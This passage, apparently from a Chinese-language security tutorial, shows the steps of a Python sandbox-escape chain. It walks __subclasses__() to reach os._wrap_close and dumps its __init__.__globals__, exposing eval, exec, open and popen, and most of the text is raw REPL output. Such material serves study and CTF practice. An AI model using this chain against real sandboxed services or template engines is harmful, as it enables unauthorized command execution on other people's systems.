<span class="string">&#x27;_collections._tuplegetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections._Link&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_cache_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partialmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.singledispatchmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.ContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._GeneratorContextManagerBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._BaseExitStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enum.auto&#x27;</span>&gt;, &lt;enum <span class="string">&#x27;Enum&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re.Pattern&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re.Match&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;sre_parse.State&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;sre_parse.SubPattern&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;sre_parse.Tokenizer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;re.Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._Final&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._Immutable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.Generic&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._TypingEmpty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing._TypingEllipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.Annotated&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.NamedTuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.TypedDict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.io&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;typing.re&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.Finder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.Loader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib.abc.ResourceReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;rlcompleter.Completer&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure><p>找到需要使用的类，其中有可以使用的类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;,&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>调用他们</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>]  <span class="comment"># 是在上面列表中的第134个值,由于是数组所以填133</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>然后查看里面有什么可以利用的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__</span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="string">&quot;OS routines for NT or Posix depending on what system we&#x27;re on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either &#x27;posix&#x27; or &#x27;nt&#x27;\n  - os.curdir is a string representing the current directory (always &#x27;.&#x27;)\n  - os.pardir is a string representing the parent directory (always &#x27;..&#x27;)\n  - os.sep is the (or a most common) pathname separator (&#x27;/&#x27; or &#x27;\\\\&#x27;)\n  - os.extsep is the extension separator (always &#x27;.&#x27;)\n  - os.altsep is the alternate pathname separator (None or &#x27;/&#x27;)\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files (&#x27;\\r&#x27; or &#x27;\\n&#x27; or &#x27;\\r\\n&#x27;)\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device (&#x27;/dev/null&#x27;, etc.)\n\nPrograms that import and use &#x27;os&#x27; stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir), and leave all pathname manipulation to os.path\n(e.g., split and join).\n&quot;</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x7fc7ef53bbb0</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;os&#x27;</span>, loader=&lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x7fc7ef53bbb0</span>&gt;, origin=<span class="string">&#x27;/usr/lib/python3.9/os.py&#x27;</span>), <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;/usr/lib/python3.9/os.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: <span class="string">&#x27;/usr/lib/python3.9/__pycache__/os.cpython-39.pyc&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>: &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="string">&quot;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#x27; object; Ellipsis represents `...&#x27; in slices.&quot;</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;builtins&#x27;</span>, loader=&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, origin=<span class="string">&#x27;built-in&#x27;</span>), <span class="string">&#x27;__build_class__&#x27;</span>: &lt;built-<span class="keyword">in</span> function __build_class__&gt;, <span class="string">&#x27;__import__&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;, <span class="string">&#x27;abs&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;, <span class="string">&#x27;all&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">all</span>&gt;, <span class="string">&#x27;any&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">any</span>&gt;, <span class="string">&#x27;ascii&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ascii</span>&gt;, <span class="string">&#x27;bin&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">bin</span>&gt;, <span class="string">&#x27;breakpoint&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">breakpoint</span>&gt;, <span class="string">&#x27;callable&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">callable</span>&gt;, <span class="string">&#x27;chr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">chr</span>&gt;, <span class="string">&#x27;compile&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">compile</span>&gt;, <span class="string">&#x27;delattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">delattr</span>&gt;, <span class="string">&#x27;dir&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">dir</span>&gt;, <span class="string">&#x27;divmod&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">divmod</span>&gt;, <span class="string">&#x27;eval&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;, <span class="string">&#x27;exec&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">exec</span>&gt;, <span class="string">&#x27;format&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">format</span>&gt;, <span class="string">&#x27;getattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">getattr</span>&gt;, <span class="string">&#x27;globals&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">globals</span>&gt;, <span class="string">&#x27;hasattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hasattr</span>&gt;, <span class="string">&#x27;hash&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hash</span>&gt;, <span class="string">&#x27;hex&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hex</span>&gt;, <span class="string">&#x27;id&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">id</span>&gt;, <span class="string">&#x27;input&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">input</span>&gt;, <span class="string">&#x27;isinstance&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">isinstance</span>&gt;, <span class="string">&#x27;issubclass&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">issubclass</span>&gt;, <span class="string">&#x27;iter&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">iter</span>&gt;, <span class="string">&#x27;len&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">len</span>&gt;, <span class="string">&#x27;locals&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">locals</span>&gt;, <span class="string">&#x27;max&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">max</span>&gt;, <span class="string">&#x27;min&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">min</span>&gt;, <span class="string">&#x27;next&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">next</span>&gt;, <span class="string">&#x27;oct&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">oct</span>&gt;, <span class="string">&#x27;ord&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ord</span>&gt;, <span class="string">&#x27;pow&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">pow</span>&gt;, <span class="string">&#x27;print&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">print</span>&gt;, <span class="string">&#x27;repr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">repr</span>&gt;, <span class="string">&#x27;round&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">round</span>&gt;, <span class="string">&#x27;setattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">setattr</span>&gt;, <span class="string">&#x27;sorted&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">sorted</span>&gt;, <span class="string">&#x27;sum&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">sum</span>&gt;, <span class="string">&#x27;vars&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">vars</span>&gt;, <span class="string">&#x27;None&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;Ellipsis&#x27;</span>: <span class="literal">Ellipsis</span>, <span class="string">&#x27;NotImplemented&#x27;</span>: <span class="literal">NotImplemented</span>, <span class="string">&#x27;False&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;True&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;bool&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;, <span class="string">&#x27;memoryview&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, <span class="string">&#x27;bytearray&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, <span class="string">&#x27;bytes&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, <span class="string">&#x27;classmethod&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, <span class="string">&#x27;complex&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, <span class="string">&#x27;dict&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, <span class="string">&#x27;enumerate&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, <span class="string">&#x27;filter&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, <span class="string">&#x27;float&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, <span class="string">&#x27;frozenset&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, <span class="string">&#x27;property&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, <span class="string">&#x27;int&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, <span class="string">&#x27;list&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, <span class="string">&#x27;map&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, <span class="string">&#x27;object&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;, <span class="string">&#x27;range&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, <span class="string">&#x27;reversed&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, <span class="string">&#x27;set&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, <span class="string">&#x27;slice&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, <span class="string">&#x27;staticmethod&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, <span class="string">&#x27;str&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, <span class="string">&#x27;super&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, <span class="string">&#x27;tuple&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, <span class="string">&#x27;type&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, <span class="string">&#x27;zip&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;, <span class="string">&#x27;__debug__&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;BaseException&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, <span class="string">&#x27;Exception&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;Exception&#x27;</span>&gt;, <span class="string">&#x27;TypeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;TypeError&#x27;</span>&gt;, <span class="string">&#x27;StopAsyncIteration&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;StopAsyncIteration&#x27;</span>&gt;, <span class="string">&#x27;StopIteration&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;StopIteration&#x27;</span>&gt;, <span class="string">&#x27;GeneratorExit&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;GeneratorExit&#x27;</span>&gt;, <span class="string">&#x27;SystemExit&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SystemExit&#x27;</span>&gt;, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;KeyboardInterrupt&#x27;</span>&gt;, <span class="string">&#x27;ImportError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ImportError&#x27;</span>&gt;, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ModuleNotFoundError&#x27;</span>&gt;, <span class="string">&#x27;OSError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;EnvironmentError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;IOError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;EOFError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;EOFError&#x27;</span>&gt;, <span class="string">&#x27;RuntimeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;RuntimeError&#x27;</span>&gt;, <span class="string">&#x27;RecursionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;RecursionError&#x27;</span>&gt;, <span class="string">&#x27;NotImplementedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedError&#x27;</span>&gt;, <span class="string">&#x27;NameError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;NameError&#x27;</span>&gt;, <span class="string">&#x27;UnboundLocalError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnboundLocalError&#x27;</span>&gt;, <span class="string">&#x27;AttributeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;AttributeError&#x27;</span>&gt;, <span class="string">&#x27;SyntaxError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SyntaxError&#x27;</span>&gt;, <span class="string">&#x27;IndentationError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;IndentationError&#x27;</span>&gt;, <span class="string">&#x27;TabError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;TabError&#x27;</span>&gt;, <span class="string">&#x27;LookupError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;LookupError&#x27;</span>&gt;, <span class="string">&#x27;IndexError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;IndexError&#x27;</span>&gt;, <span class="string">&#x27;KeyError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;KeyError&#x27;</span>&gt;, <span class="string">&#x27;ValueError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ValueError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeEncodeError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeDecodeError&#x27;</span>&gt;, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeTranslateError&#x27;</span>&gt;, <span class="string">&#x27;AssertionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;AssertionError&#x27;</span>&gt;, <span class="string">&#x27;ArithmeticError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ArithmeticError&#x27;</span>&gt;, <span class="string">&#x27;FloatingPointError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FloatingPointError&#x27;</span>&gt;, <span class="string">&#x27;OverflowError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OverflowError&#x27;</span>&gt;, <span class="string">&#x27;ZeroDivisionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ZeroDivisionError&#x27;</span>&gt;, <span class="string">&#x27;SystemError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SystemError&#x27;</span>&gt;, <span class="string">&#x27;ReferenceError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ReferenceError&#x27;</span>&gt;, <span class="string">&#x27;MemoryError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;MemoryError&#x27;</span>&gt;, <span class="string">&#x27;BufferError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BufferError&#x27;</span>&gt;, <span class="string">&#x27;Warning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;Warning&#x27;</span>&gt;, <span class="string">&#x27;UserWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UserWarning&#x27;</span>&gt;, <span class="string">&#x27;DeprecationWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;DeprecationWarning&#x27;</span>&gt;, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>&gt;, <span class="string">&#x27;SyntaxWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;SyntaxWarning&#x27;</span>&gt;, <span class="string">&#x27;RuntimeWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;RuntimeWarning&#x27;</span>&gt;, <span class="string">&#x27;FutureWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FutureWarning&#x27;</span>&gt;, <span class="string">&#x27;ImportWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ImportWarning&#x27;</span>&gt;, <span class="string">&#x27;UnicodeWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeWarning&#x27;</span>&gt;, <span class="string">&#x27;BytesWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BytesWarning&#x27;</span>&gt;, <span class="string">&#x27;ResourceWarning&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ResourceWarning&#x27;</span>&gt;, <span class="string">&#x27;ConnectionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionError&#x27;</span>&gt;, <span class="string">&#x27;BlockingIOError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BlockingIOError&#x27;</span>&gt;, <span class="string">&#x27;BrokenPipeError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;BrokenPipeError&#x27;</span>&gt;, <span class="string">&#x27;ChildProcessError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ChildProcessError&#x27;</span>&gt;, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionAbortedError&#x27;</span>&gt;, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionRefusedError&#x27;</span>&gt;, <span class="string">&#x27;ConnectionResetError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ConnectionResetError&#x27;</span>&gt;, <span class="string">&#x27;FileExistsError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FileExistsError&#x27;</span>&gt;, <span class="string">&#x27;FileNotFoundError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;FileNotFoundError&#x27;</span>&gt;, <span class="string">&#x27;IsADirectoryError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;IsADirectoryError&#x27;</span>&gt;, <span class="string">&#x27;NotADirectoryError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;NotADirectoryError&#x27;</span>&gt;, <span class="string">&#x27;InterruptedError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;InterruptedError&#x27;</span>&gt;, <span class="string">&#x27;PermissionError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;PermissionError&#x27;</span>&gt;, <span class="string">&#x27;ProcessLookupError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;ProcessLookupError&#x27;</span>&gt;, <span class="string">&#x27;TimeoutError&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;TimeoutError&#x27;</span>&gt;, <span class="string">&#x27;open&#x27;</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, <span class="string">&#x27;quit&#x27;</span>: Use quit() <span class="keyword">or</span> Ctrl-D (i.e. EOF) to exit, <span class="string">&#x27;exit&#x27;</span>: Use exit() <span class="keyword">or</span> Ctrl-D (i.e. EOF) to exit, <span class="string">&#x27;copyright&#x27;</span>: Copyright (c) <span class="number">2001</span>-<span class="number">2022</span> Python Software Foundation.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span> BeOpen.com.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">1995</span>-<span class="number">2001</span> Corporation <span class="keyword">for</span> National Research Initiatives.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">1991</span>-<span class="number">1995</span> Stichting Mathematisch Centrum, Amsterdam.</span><br><span class="line">All Rights Reserved., <span class="string">&#x27;credits&#x27;</span>:     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation <span class="keyword">and</span> a cast of thousands</span><br><span class="line">    <span class="keyword">for</span> supporting Python development.  See www.python.org <span class="keyword">for</span> more information., <span class="string">&#x27;license&#x27;</span>: <span class="type">Type</span> license() to see the full license text, <span class="string">&#x27;help&#x27;</span>: <span class="type">Type</span> <span class="built_in">help</span>() <span class="keyword">for</span> interactive <span class="built_in">help</span>, <span class="keyword">or</span> <span class="built_in">help</span>(<span class="built_in">object</span>) <span class="keyword">for</span> <span class="built_in">help</span> about <span class="built_in">object</span>., <span class="string">&#x27;_&#x27;</span>: <span class="literal">None</span>&#125;, <span class="string">&#x27;abc&#x27;</span>: &lt;module <span class="string">&#x27;abc&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python3.9/abc.py&#x27;</span>&gt;, <span class="string">&#x27;sys&#x27;</span>: &lt;module <span class="string">&#x27;sys&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;st&#x27;</span>: &lt;module <span class="string">&#x27;stat&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python3.9/stat.py&#x27;</span>&gt;, <span class="string">&#x27;_check_methods&#x27;</span>: &lt;function _check_methods at <span class="number">0x7fc7ef547a60</span>&gt;, <span class="string">&#x27;GenericAlias&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;types.GenericAlias&#x27;</span>&gt;, <span class="string">&#x27;__all__&#x27;</span>: [<span class="string">&#x27;altsep&#x27;</span>, <span class="string">&#x27;curdir&#x27;</span>, <span class="string">&#x27;pardir&#x27;</span>, <span class="string">&#x27;sep&#x27;</span>, <span class="string">&#x27;pathsep&#x27;</span>, <span class="string">&#x27;linesep&#x27;</span>, <span class="string">&#x27;defpath&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;devnull&#x27;</span>, <span class="string">&#x27;SEEK_SET&#x27;</span>, <span class="string">&#x27;SEEK_CUR&#x27;</span>, <span class="string">&#x27;SEEK_END&#x27;</span>, <span class="string">&#x27;fsencode&#x27;</span>, <span class="string">&#x27;fsdecode&#x27;</span>, <span class="string">&#x27;get_exec_path&#x27;</span>, <span class="string">&#x27;fdopen&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;extsep&#x27;</span>, <span class="string">&#x27;_exit&#x27;</span>, <span class="string">&#x27;CLD_CONTINUED&#x27;</span>, <span class="string">&#x27;CLD_DUMPED&#x27;</span>, <span class="string">&#x27;CLD_EXITED&#x27;</span>, <span class="string">&#x27;CLD_KILLED&#x27;</span>, <span class="string">&#x27;CLD_STOPPED&#x27;</span>, <span class="string">&#x27;CLD_TRAPPED&#x27;</span>, <span class="string">&#x27;DirEntry&#x27;</span>, <span class="string">&#x27;EX_CANTCREAT&#x27;</span>, <span class="string">&#x27;EX_CONFIG&#x27;</span>, <span class="string">&#x27;EX_DATAERR&#x27;</span>, <span 